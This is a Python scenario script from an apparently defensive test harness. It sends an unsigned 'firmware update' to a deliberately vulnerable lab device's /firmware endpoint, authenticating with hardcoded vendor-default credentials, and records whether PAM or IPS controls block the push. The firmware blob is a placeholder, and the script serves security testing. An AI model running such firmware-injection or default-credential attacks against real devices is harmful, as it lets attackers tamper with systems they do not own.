#!/usr/bin/env python3
"""
Scenario 02 — Firmware injection (Tampering, T category).

Pushes an unsigned firmware "update" via the management interface. The
deliberately-vulnerable target accepts any payload — the constraint under test.

Compensating controls expected to mitigate:
  - PAM upstream: prevents direct attacker-to-target connections
  - IPS virtual patching: signature-based blocking of /firmware POST from non-PAM origin
"""

import base64
import json
import os
import urllib.request
import urllib.error

STRIDE_HC = "T"
SCENARIO_NAME = "02-tampering-firmware-injection"

TARGET_HOST = os.environ.get("TARGET_HOST", "172.28.10.20")
TARGET_PORT = int(os.environ.get("TARGET_MGMT_PORT", "8080"))


def run() -> dict:
    payload = json.dumps({
        "version": "0.0.1-attacker-controlled",
        "blob": "AAAA" * 100,   # representative malicious firmware payload
    }).encode()

    token = base64.b64encode(b"service:Vendor1234").decode()

    req = urllib.request.Request(
        f"http://{TARGET_HOST}:{TARGET_PORT}/firmware",
        data=payload,
        method="POST",
        headers={
            "Authorization": f"Basic {token}",
            "Content-Type": "application/json",
        },
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
        result = json.loads(body)
        if result.get("ok"):
            return {
                "scenario": SCENARIO_NAME,
                "stride_hc": STRIDE_HC,
                "outcome": "SUCCESS",
                "detail": f"Firmware injection succeeded; reported version: {result.get('firmware_version')}",
            }
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "REJECTED",
            "detail": str(result),
        }
    except urllib.error.HTTPError as e:
        if e.code == 401:
            return {
                "scenario": SCENARIO_NAME,
                "stride_hc": STRIDE_HC,
                "outcome": "BLOCKED_AUTH",
                "detail": "Authentication required (PAM upstream may have stripped attacker auth)",
            }
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "BLOCKED_HTTP",
            "detail": f"HTTP {e.code}",
        }
    except (urllib.error.URLError, OSError) as e:
        return {
            "scenario": SCENARIO_NAME,
            "stride_hc": STRIDE_HC,
            "outcome": "BLOCKED_NET",
            "detail": f"Network blocked: {e}",
        }


if __name__ == "__main__":
    import json as _json
    print(_json.dumps(run(), indent=2))
